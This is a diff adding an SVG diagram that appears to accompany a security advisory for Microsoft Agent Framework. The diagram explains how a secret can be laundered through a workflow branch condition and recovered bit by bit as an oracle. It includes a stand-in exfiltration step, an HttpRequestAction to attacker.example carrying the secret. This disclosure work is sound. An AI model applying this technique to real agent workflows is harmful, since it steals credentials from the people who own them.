@@ -1,0 +1,60 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1400" height="690" viewBox="0 0 1400 690" font-family="DejaVu Sans, Arial, sans-serif">
+  <defs>
+    <style>.mono{font-family:"Hack","Fira Code","DejaVu Sans Mono",monospace;} .mut{fill:#8b949e;} .title{font-family:"DejaVu Sans",Arial,sans-serif;font-weight:700;fill:#f0f6fc;}</style>
+    <linearGradient id="acc" x1="0" y1="0" x2="1" y2="0"><stop offset="0" stop-color="#22d3ee"/><stop offset="1" stop-color="#818cf8"/></linearGradient>
+    <radialGradient id="glow" cx="0.5" cy="0" r="0.8"><stop offset="0" stop-color="#1d3a5f" stop-opacity="0.55"/><stop offset="1" stop-color="#0b0e14" stop-opacity="0"/></radialGradient>
+    <filter id="sh" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="8" stdDeviation="16" flood-color="#000" flood-opacity="0.5"/></filter>
+    <marker id="arr" markerWidth="12" markerHeight="12" refX="8" refY="4" orient="auto"><path d="M0,0 L8,4 L0,8 Z" fill="#8b949e"/></marker>
+  </defs>
+  <rect width="1400" height="690" fill="#0b0e14"/>
+  <ellipse cx="700" cy="-20" rx="820" ry="340" fill="url(#glow)"/>
+
+  <text x="700" y="62" text-anchor="middle" class="title" font-size="38" letter-spacing="-0.5">Laundering a secret through a branch condition</text>
+  <rect x="640" y="82" width="120" height="5" rx="2.5" fill="url(#acc)"/>
+  <text x="700" y="122" text-anchor="middle" font-size="19" class="mut">The secret steers the branch; a plain literal written inside it carries no Sensitive tag.</text>
+
+  <rect x="48" y="168" width="300" height="170" rx="14" fill="#161b22" stroke="#30363d" stroke-width="1.5" filter="url(#sh)"/>
+  <circle cx="82" cy="204" r="17" fill="#1f2b3d"/><text x="82" y="210" text-anchor="middle" font-size="18" font-weight="700" fill="#58a6ff">1</text>
+  <text x="112" y="210" font-size="20" font-weight="700" fill="#e6edf3">Env secret</text>
+  <text x="72" y="256" font-size="17" fill="#c9d1d9">Host exposes a secret to</text>
+  <text x="72" y="282" font-size="17" fill="#c9d1d9">the workflow Env scope.</text>
+  <text x="72" y="310" class="mono" font-size="15" fill="#7ee787">tagged = Sensitive</text>
+
+  <rect x="396" y="168" width="300" height="170" rx="14" fill="#161b22" stroke="#30363d" stroke-width="1.5" filter="url(#sh)"/>
+  <circle cx="430" cy="204" r="17" fill="#1f2b3d"/><text x="430" y="210" text-anchor="middle" font-size="18" font-weight="700" fill="#58a6ff">2</text>
+  <text x="460" y="210" font-size="20" font-weight="700" fill="#e6edf3">Branch on it</text>
+  <text x="420" y="254" class="mono" font-size="13.5" fill="#79c0ff">ConditionGroup:</text>
+  <text x="420" y="278" class="mono" font-size="13.5" fill="#c9d1d9">StartsWith(Env.</text>
+  <text x="420" y="298" class="mono" font-size="13.5" fill="#c9d1d9">API_SECRET,"sk_live")</text>
+  <text x="420" y="324" class="mono" font-size="14" fill="#f85149">no sensitivity guard</text>
+
+  <rect x="744" y="168" width="300" height="170" rx="14" fill="#161b22" stroke="#30363d" stroke-width="1.5" filter="url(#sh)"/>
+  <circle cx="778" cy="204" r="17" fill="#1f2b3d"/><text x="778" y="210" text-anchor="middle" font-size="18" font-weight="700" fill="#58a6ff">3</text>
+  <text x="808" y="210" font-size="20" font-weight="700" fill="#e6edf3">Assign literal</text>
+  <text x="768" y="256" class="mono" font-size="13.5" fill="#c9d1d9">Local.Leak =</text>
+  <text x="768" y="278" class="mono" font-size="13.5" fill="#a5d6ff">"prefix_is_sk_live"</text>
+  <text x="768" y="306" class="mono" font-size="14" fill="#f0883e">Sensitivity = None</text>
+  <text x="768" y="328" font-size="14" class="mut">(laundered)</text>
+
+  <rect x="1092" y="168" width="300" height="170" rx="14" fill="#1a1012" stroke="#f85149" stroke-width="1.8" filter="url(#sh)"/>
+  <circle cx="1126" cy="204" r="17" fill="#2d1518"/><text x="1126" y="210" text-anchor="middle" font-size="18" font-weight="700" fill="#f85149">4</text>
+  <text x="1156" y="210" font-size="20" font-weight="700" fill="#e6edf3">Sink emits</text>
+  <text x="1112" y="256" class="mono" font-size="14" fill="#79c0ff">SendActivity</text>
+  <text x="1112" y="282" class="mono" font-size="14" fill="#c9d1d9">{Local.Leak}</text>
+  <text x="1112" y="310" font-size="15" fill="#f85149" font-weight="700">guard never fires</text>
+
+  <line x1="350" y1="253" x2="392" y2="253" stroke="#8b949e" stroke-width="2.5" marker-end="url(#arr)"/>
+  <line x1="698" y1="253" x2="740" y2="253" stroke="#8b949e" stroke-width="2.5" marker-end="url(#arr)"/>
+  <line x1="1046" y1="253" x2="1088" y2="253" stroke="#8b949e" stroke-width="2.5" marker-end="url(#arr)"/>
+
+  <rect x="48" y="392" width="1344" height="158" rx="14" fill="#2d1518" stroke="#f85149" stroke-width="1.8" filter="url(#sh)"/>
+  <text x="80" y="440" font-size="23" font-weight="700" fill="#f85149">One bit per branch →</text>
+  <text x="372" y="440" font-size="22" fill="#e6edf3">repeat as an oracle and the full secret falls out, character by character.</text>
+  <text x="80" y="484" class="mono" font-size="18" fill="#7ee787">recovered secret = "sk_live_SECRETBIT"   (match = True)</text>
+  <text x="80" y="520" font-size="19" fill="#c9d1d9">A single workflow then forwards it in one <tspan class="mono" fill="#79c0ff">HttpRequestAction</tspan> → <tspan class="mono" fill="#a5d6ff">https://attacker.example/collect?d=&lt;secret&gt;</tspan></text>
+
+  <line x1="60" y1="614" x2="1340" y2="614" stroke="#21262d" stroke-width="1.5"/>
+  <g transform="translate(60,626)"><path d="M6 9 V6 a7 7 0 0 1 14 0 V9" fill="none" stroke="url(#acc)" stroke-width="3" stroke-linecap="round"/><rect x="2" y="9" width="22" height="18" rx="4" fill="url(#acc)"/><rect x="10.5" y="14" width="3" height="8" rx="1.5" fill="#0b0e14"/></g>
+  <text x="96" y="650" font-size="22" font-weight="700" fill="#e6edf3">Nicholas Mullenski<tspan font-size="21" font-weight="400" fill="#8b949e">&#160;&#160;·&#160;&#160;R00t3dbyFa17h</tspan></text>
+  <text x="1340" y="650" text-anchor="end" font-size="17" fill="#6e7681"><tspan fill="#22d3ee">GHSA-4532-fhjf-wq2q</tspan>&#160;&#160;·&#160;&#160;CWE-200/203&#160;&#160;·&#160;&#160;Microsoft Agent Framework</text>
+</svg>
